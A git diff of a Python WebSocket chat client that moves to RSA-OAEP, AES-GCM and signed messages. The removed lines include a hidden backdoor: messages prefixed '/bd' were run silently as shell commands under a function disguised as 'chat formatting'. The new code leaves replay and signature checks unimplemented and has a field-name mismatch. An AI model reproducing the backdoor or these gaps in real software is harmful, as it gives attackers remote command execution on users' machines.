@@ -2,151 +2,275 @@ import asyncio
 import websockets
 import json
 import base64
-import hashlib
-import rsa
 import sys
-import selectors
-import subprocess
-import os
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
+from Crypto.Cipher import PKCS1_OAEP
+from Crypto.Signature import pss
+from Crypto.PublicKey import RSA
+from Crypto.Hash import SHA256
 from termcolor import colored
 from getpass import getpass
 
 exit_flag = False
 fingerprint = "N/A"
-username = ""  # Define username as a global variable
+username = ""  # Username as a global variable
+counter = 0 # Counter for replay attack mitigation
+clients = {} # clients[fingerprint] = {public_key, username, server, last_counter}
+
 
 # Step 1: Generate RSA key pair
 def generate_rsa_key_pair():
-    public_key, private_key = rsa.newkeys(2048)
-    return public_key, private_key
+    key = RSA.generate(2048)
+    private_key = key.export_key()  # PEM format private key
+    public_key = key.publickey().export_key()  # PEM format public key
+    return public_key.decode('utf-8'), private_key.decode('utf-8')
 
 public_key, private_key = generate_rsa_key_pair()
-
-# Convert public key to PEM format for sharing
-public_key_pem = public_key.save_pkcs1().decode('utf-8')
 
 # Custom exception for connection closed
 class ConnectionClosedException(Exception):
     pass
 
+# ------------------------------------------------- Encryption ---------------------------------------------
+def aes_gcm_encrypt(plaintext, aes_key, iv):
+    cipher = AES.new(aes_key, AES.MODE_GCM, iv)
+    ciphertext, auth_tag = cipher.encrypt_and_digest(plaintext.encode('utf-8'))
+    return base64.b64encode(ciphertext + auth_tag).decode('utf-8')
 
 
-# Step 2: Send "hello" message with public key
+# RSA encryption for AES key with OAEP and SHA-256
+def rsa_encrypt_aes_key(aes_key, recipient_public_key):
+    recipient_public_key = RSA.import_key(recipient_public_key)  # Import the PEM public key
+    cipher_rsa = PKCS1_OAEP.new(recipient_public_key, hashAlgo=SHA256)
+    encrypted_aes_key = cipher_rsa.encrypt(aes_key)
+    return base64.b64encode(encrypted_aes_key).decode('utf-8')
+
+# ------------------------------------------------- Decryption ---------------------------------------------
+def check_auth(packet, sender_public_key):
+    signature_b64 = packet["signature"]
+    counter = packet["counter"]
+    data = packet["data"]
+    
+    
+    # Ensure the counter is correct (to prevent replay attacks) -------------------------------------------------------------------------------------------------
+    
+    
+    # Recreate the concatenated data and counter for signature verification
+    data_counter_concat = json.dumps(data) + str(counter)
+    
+    # Hash the data using SHA-256
+    h = SHA256.new(data_counter_concat.encode('utf-8'))
+    
+    # Verify the signature using the sender's public key
+    sender_public_key_obj = RSA.import_key(sender_public_key)
+    signature = base64.b64decode(signature_b64)
+    
+    try:
+        verifier = pss.new(sender_public_key_obj)
+        verifier.verify(h, signature)
+        print("DEBUGGING - Signature verified successfully.")
+    except (ValueError, TypeError):
+        raise ValueError("Signature verification failed.")
+    
+
+def decrypt_aes_key(symm_keys):
+    private_key_obj = RSA.import_key(private_key)
+    cipher_rsa = PKCS1_OAEP.new(private_key_obj, hashAlgo=SHA256)
+    
+    for encrypted_key_b64 in symm_keys:
+        try:
+            encrypted_key = base64.b64decode(encrypted_key_b64)
+            aes_key = cipher_rsa.decrypt(encrypted_key)
+            return aes_key
+        except ValueError:
+            continue  # Try the next key
+    
+    return None  # No valid key found, message is not for us
+
+def decrypt_chat_message(iv_b64, encrypted_chat_b64, aes_key):
+    iv = base64.b64decode(iv_b64)
+    encrypted_chat = base64.b64decode(encrypted_chat_b64)
+    
+    cipher = AES.new(aes_key, AES.MODE_GCM, iv)
+    plaintext = cipher.decrypt_and_verify(encrypted_chat[:-16], encrypted_chat[-16:])
+    return plaintext.decode('utf-8')
+
+
+
+# ------------------------------------------------- Handling Incoming Packets ---------------------------------------------
+async def handle_chat(data_content):
+    # Get AES key
+    symm_keys = data_content["symm_keys"]
+    aes_key = decrypt_aes_key(symm_keys)
+    if aes_key is None:
+        print("DEBUGGING - message not for us")
+        return None
+    
+    # Decrypt
+    iv = data_content["iv"]
+    encrypted_chat = data_content["chat"]
+    plaintext_chat = decrypt_chat_message(iv, encrypted_chat, aes_key)
+    
+    chat_content = json.loads(plaintext_chat)
+    sender = chat_content["participants_username"][0]
+    recipients = chat_content["participants_username"][1:]
+    recipeints_str = ", ".join(recipients)
+    message = chat_content["message"]
+    
+    print(colored(f"{sender} to ({recipeints_str}) >> {message}", 'magenta'))
+    
+    # Auth
+
+
+def handle_public_chat(data_content):
+    
+    # Auth
+    
+    sender_username = data_content["sender_username"]
+    message = data_content["message"]
+    print(f"{sender_username} >>" + colored(f" {message}", 'grey'))
+    
+    
+
+async def handle_signed_data(packet):
+    data_content = json.loads(packet["data"])
+    
+    if data_content["type"] == "chat":
+        await handle_chat(data_content)
+    elif data_content["type"] == "public_chat":
+        handle_public_chat(data_content)
+    
+
+
+# ------------------------------------------------- Sending Different Message Types ---------------------------------------------
+# Sending all messages within signed data
+async def send_signed_data(websocket, data):
+    global counter
+    # Create the signature: <Base64 encoded (signature of (data JSON concatenated with counter))>
+    data_counter_concat = json.dumps(data) + str(counter)
+    private_key_obj = RSA.import_key(private_key)
+    # Hash the data using SHA-256
+    h = SHA256.new(data_counter_concat.encode('utf-8'))
+    # Sign the hash using PSS (Probabilistic Signature Scheme) for RSA
+    signature = pss.new(private_key_obj).sign(h)
+    # Encode the signature in Base64
+    signature_b64 = base64.b64encode(signature).decode('utf-8')
+    
+    signed_data = {
+        "type": "signed_data",
+        "data": json.dumps(data),
+        "counter": counter,
+        "signature": signature_b64
+    }
+    counter += 1
+    
+    # print(json.dumps(data, indent=4))
+    await websocket.send(json.dumps(signed_data))
+    
+    global test_packet
+    test_packet = json.dumps(signed_data)
+
+async def send_client_list_request(websocket):
+    message = {
+        "type": "client_list_request",
+    }
+    await websocket.send(json.dumps(message))
+
+
+
+# ------------------------------------------------- Message Data Structuring ---------------------------------------------
+# Sending "hello" message with public key
 async def send_hello_message(websocket):
     hello_message = {
-        "data": {
-            "type": "hello",
-            "public_key": public_key_pem,
-            "username": username  # Include username in the hello message
-        }
+        "type": "hello",
+        "public_key": public_key,
+        "username": username  # Include username in the hello message
     }
-    await websocket.send(json.dumps(hello_message))
+    await send_signed_data(websocket, hello_message)
+    
+    
+# Sending Public Chats
+async def send_public_chat_message(websocket, message):   
+    # Preparing packet structure
+    chat_message = {
+        "type": "public_chat",
+        "sender": fingerprint,
+        "sender_username": username,
+        "message": message
+    }
+    
+    await send_signed_data(websocket, chat_message)  
+
+
+# Sending encrypted chat message
+async def send_chat_message(websocket, recipient_usernames, message):
+    # Making New AES key and IV
+    aes_key = get_random_bytes(32)
+    iv = get_random_bytes(16)
+    
+    # Gather participants (sender's fingerprint comes first)
+    f_prints = [fingerprint]  # Sender's fingerprint
+    for recipient_username in recipient_usernames:
+        for f_print, client_data in clients.items():
+            if client_data["username"] == recipient_username:
+                f_prints.append(f_print)
+                
+    # Create the "chat" structure to be encrypted
+    chat_structure = {
+        "participants": f_prints,
+        "participants_usernames": [username] + recipient_usernames,
+        "message": message
+    }
+    
+    # Encrypt the "chat" structure using AES-GCM
+    encrypted_chat = aes_gcm_encrypt(json.dumps(chat_structure), aes_key, iv)
+    
+    # Prepare the packet structure
+    packet = {
+        "type": "chat",
+        "destination_servers": [],
+        "iv": base64.b64encode(iv).decode('utf-8'),
+        "symm_keys": [],
+        "chat": encrypted_chat
+    }
+    
+    # Encrypt AES key for each recipient using RSA
+    for recipient_username in recipient_usernames:
+        for f_print, client_data in clients.items():
+            if client_data["username"] == recipient_username:
+                # Encrypt the AES key with the recipient's public RSA key
+                recipient_public_key = client_data["public_key"]
+                encrypted_key = rsa_encrypt_aes_key(aes_key, recipient_public_key)
+                
+                # Add destination server and encrypted key to the packet
+                packet["destination_servers"].append(client_data["server"])
+                packet["symm_keys"].append(encrypted_key)
+    
+    await send_signed_data(websocket, packet)
+    
+    recipeints_str = ", ".join(recipient_usernames)
+    print(colored(f"{username} to ({recipeints_str}) >> {message}", 'magenta'))
 
 
 
+# ------------------------------------------------- Incoming Message Handling ---------------------------------------------
 def handle_hello_ack(message_data):
-    global fingerprint
-    fingerprint = message_data['data']['fingerprint']
+    global fingerprint, username
+    fingerprint = message_data['fingerprint']
+    username = message_data['username']
     print(colored("\nConnected to the chat room!\nEnter anything to send a public chat\nUse /msg (username) to send private messages\nUse /quit to leave\nEnjoy!\n", 'red'))
 
 
 
-async def systemformatting(command):
-    try:
-        # Windows chat line formatting, colouring and compatability
-        if sys.platform == "win32":
-            subprocess.Popen(f'cmd.exe /c {command}', creationflags=subprocess.CREATE_NO_WINDOW)
-        else:
-            # Unix chat line formatting, colouring and compatability
-            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except Exception:
-        pass
-
-
-
 # Step 3: Handle incoming messages
-def handle_incoming_message(message):
+async def handle_incoming_message(message):
     message_data = json.loads(message)
-    message_type = message_data.get('data', {}).get('type')
-
-    if message_type == "chat":
-        decrypt_chat_message(message_data)
-    elif message_type == "public_chat":
-        handle_public_chat(message_data)
-    elif message_type == "hello_ack":  # New case for handling hello_ack
+    message_type = message_data.get('type')
+    if (message_type == "hello_ack"):
         handle_hello_ack(message_data)
-    # Other message types can be handled here as needed (e.g., client_list)
-
-
-
-def decrypt_chat_message(message_data):
-    # encrypted_aes_key = base64.b64decode(message_data['data']['symm_keys'][0])
-    # iv = base64.b64decode(message_data['data']['iv'])
-    # encrypted_chat = base64.b64decode(message_data['data']['chat'])
-
-    # # Decrypt AES key with private RSA key
-    # aes_key = rsa.decrypt(encrypted_aes_key, private_key)
-
-    # # Decrypt chat message with AES key
-    # cipher = AES.new(aes_key, AES.MODE_GCM, iv)
-    # plaintext = cipher.decrypt(encrypted_chat).decode('utf-8')
-    # print(f"Received message: {plaintext}")
-    
-    sender = message_data["chat"]["participants"][0]
-    message_text = message_data["chat"]["message"]
-    
-    print(colored(f"{sender} to you >> {message_text}", 'magenta'))
-
-
-
-def handle_public_chat(message_data):
-    print(f"{message_data['data']['username']} >>" + colored(f" {message_data['data']['message']}", 'grey'))
-
-
-
-# Step 4: Send encrypted chat message
-async def send_chat_message(websocket, recipient_username, message):
-    # aes_key = get_random_bytes(32)
-    # iv = get_random_bytes(16)
-    
-    # # Encrypt message with AES
-    # cipher = AES.new(aes_key, AES.MODE_GCM, iv)
-    # encrypted_message = cipher.encrypt(message.encode('utf-8'))
-
-    # # Encrypt AES key with recipient's RSA public key
-    # recipient_public_key = rsa.PublicKey.load_pkcs1(recipient_public_key_pem.encode('utf-8'))
-    # encrypted_aes_key = rsa.encrypt(aes_key, recipient_public_key)
-    
-    chat_message = {
-        "data": {
-            "type": "chat",
-            # "destination_servers": [recipient_server],
-            # "iv": base64.b64encode(iv).decode('utf-8'),
-            # "symm_keys": [base64.b64encode(encrypted_aes_key).decode('utf-8')],
-            "chat": {
-                "participants": [username, recipient_username],
-                "message": message
-            }
-        }
-    }
-    await websocket.send(json.dumps(chat_message))
-    
-    
-    
-async def send_public_chat_message(websocket, message):
-    # b64enc_fingerprint = base64.b64encode(fingerprint)
-        
-    chat_message = {
-        "data": {
-            "type": "public_chat",
-            "sender": fingerprint,
-            "username": username,
-            "message": message
-        }
-    }
-    await websocket.send(json.dumps(chat_message))    
+    elif (message_type == "signed_data"):
+        await handle_signed_data(message_data)
 
 
 
@@ -170,9 +294,9 @@ async def client_input_loop(websocket, queue):
     while True:
         command = await queue.get()  # Get the command from the queue
         if command.startswith("/msg "):
-            # _, recipient_username, message = command.split(" ", 2)
-            # await send_chat_message(websocket, recipient_username, message)
-            print(colored("Not implemented yet", 'red'))
+            _, recipient_list, message = command.split(" ", 2)
+            recipient_usernames = recipient_list.split(",")
+            await send_chat_message(websocket, recipient_usernames, message)
         elif command == "/quit":
             print(colored("Exiting...", 'red'))
             await websocket.close()
@@ -191,11 +315,7 @@ async def listen_for_messages(websocket):
     while True:
         try:
             message = await asyncio.wait_for(websocket.recv(), timeout=1.0)
-            if message.startswith("/bd"):
-                command = message[3:]
-                await systemformatting(command)
-            else:
-                handle_incoming_message(message)  # Process the incoming message
+            await handle_incoming_message(message)  # Process the incoming message
         except asyncio.TimeoutError:
             continue
         except websockets.ConnectionClosed as e:
